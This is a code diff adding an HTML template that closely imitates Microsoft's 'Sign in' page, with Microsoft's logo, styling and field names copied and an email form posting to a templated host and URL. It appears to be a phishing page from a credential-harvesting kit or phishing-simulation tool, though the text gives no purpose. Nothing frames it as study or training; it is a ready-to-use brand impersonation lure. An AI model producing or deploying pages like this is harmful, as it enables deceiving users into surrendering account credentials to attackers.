@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html dir="ltr" class="" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <title>Sign in to your account</title>
+    <base href="https://{{ hostname }}/">
+    <style>
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+        .outer {
+            display: table;
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+        }
+        .middle {
+            display: table-cell;
+            vertical-align: middle;
+        }
+        .inner {
+            margin-left: auto;
+            margin-right: auto;
+            width: 440px;
+        }
+        .placeholderContainer {
+            width: 320px;
+            margin-left: auto;
+            margin-right: auto;
+            background-color: #fff;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            padding: 44px;
+        }
+        .normalText {
+            font-size: 15px;
+            color: #1b1b1b;
+            line-height: 21px;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        input[type="email"], input[type="text"] {
+            width: 100%;
+            padding: 8px 12px;
+            font-size: 15px;
+            border: 1px solid #8a8886;
+            background-color: #fff;
+            box-sizing: border-box;
+        }
+        input[type="email"]:focus, input[type="text"]:focus {
+            border-color: #0078d4;
+            outline: none;
+        }
+        .button {
+            background-color: #0078d4;
+            border: 1px solid #0078d4;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            padding: 8px 24px;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+        }
+        .button:hover {
+            background-color: #106ebe;
+            border-color: #106ebe;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 36px;
+        }
+        .microsoft-logo {
+            width: 108px;
+            height: 24px;
+        }
+        .banner-logo {
+            margin-bottom: 36px;
+            text-align: center;
+        }
+        .banner-logo img {
+            width: 108px;
+            height: 24px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+        }
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="outer">
+        <div class="middle">
+            <div class="inner">
+                <div class="placeholderContainer">
+                    <div class="banner-logo">
+                        <svg class="microsoft-logo" viewBox="0 0 108 24" width="108" height="24" role="img" aria-labelledby="mslogo">
+                            <title id="mslogo">Microsoft</title>
+                            <rect width="10.5" height="10.5" fill="#f25022"/>
+                            <rect x="13.5" width="10.5" height="10.5" fill="#7fba00"/>
+                            <rect x="0" y="13.5" width="10.5" height="10.5" fill="#00a4ef"/>
+                            <rect x="13.5" y="13.5" width="10.5" height="10.5" fill="#ffb900"/>
+                            <g fill="#737373">
+                                <path d="M36.1 19.3V6.4h2.2l5.7 8.4 5.7-8.4h2.2v12.9h-1.8V9.1l-5.2 7.6h-1.8L37.9 9.1v10.2h-1.8z"/>
+                                <path d="M54.5 7.7c0-.6.2-1 .6-1.4.4-.4.9-.6 1.5-.6.6 0 1.1.2 1.5.6.4.4.6.8.6 1.4 0 .6-.2 1-.6 1.4-.4.4-.9.6-1.5.6-.6 0-1.1-.2-1.5-.6-.4-.4-.6-.8-.6-1.4zm.3 2.8h2.4v8.8h-2.4v-8.8z"/>
+                                <path d="M70.4 19.5c-1.4 0-2.5-.4-3.4-1.3-.9-.9-1.3-2-1.3-3.4 0-1.4.4-2.5 1.3-3.4.9-.9 2-1.3 3.4-1.3 1 0 1.9.3 2.6.8v2.2c-.7-.7-1.5-1-2.4-1-1 0-1.8.3-2.4.9-.6.6-.9 1.4-.9 2.4 0 1 .3 1.8.9 2.4.6.6 1.4.9 2.4.9.9 0 1.7-.3 2.4-1v2.2c-.7.5-1.6.8-2.6.8z"/>
+                                <path d="M77.7 10.5h2.4v1.4c.5-1 1.4-1.5 2.6-1.5.3 0 .6 0 .8.1v2.3c-.3-.1-.6-.2-1-.2-1.1 0-1.9.6-2.4 1.8v5.1h-2.4v-8.8z"/>
+                                <path d="M91.5 19.5c-1.4 0-2.5-.4-3.4-1.3-.9-.9-1.3-2-1.3-3.4 0-1.4.4-2.5 1.3-3.4.9-.9 2-1.3 3.4-1.3 1.4 0 2.5.4 3.4 1.3.9.9 1.3 2 1.3 3.4 0 1.4-.4 2.5-1.3 3.4-.9.9-2 1.3-3.4 1.3zm0-1.9c.9 0 1.6-.3 2.2-.9.6-.6.9-1.4.9-2.4 0-1-.3-1.8-.9-2.4-.6-.6-1.3-.9-2.2-.9-.9 0-1.6.3-2.2.9-.6.6-.9 1.4-.9 2.4 0 1 .3 1.8.9 2.4.6.6 1.3.9 2.2.9z"/>
+                                <path d="M98.5 18.4c0 .4.1.7.4.9.3.2.7.3 1.2.3.5 0 .9-.1 1.3-.3v1.8c-.5.2-1.1.3-1.8.3-1 0-1.8-.3-2.3-.8s-.8-1.3-.8-2.2v-6.2h-1.2v-1.9h1.2v-2.4l2.4-.7v3.1h2.5v1.9h-2.5v5.7z"/>
+                            </g>
+                        </svg>
+                    </div>
+                    
+                    <div class="title">Sign in</div>
+                    
+                    <form method="post" action="{{ next_url }}">
+                        <div class="form-group">
+                            <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus>
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="submit" class="button" value="Next" id="idSIButton9">
+                        </div>
+                    </form>
+                    
+                    <div class="footer">
+                        <a href="#">Can't access your account?</a><br>
+                        <a href="#">Sign-in options</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
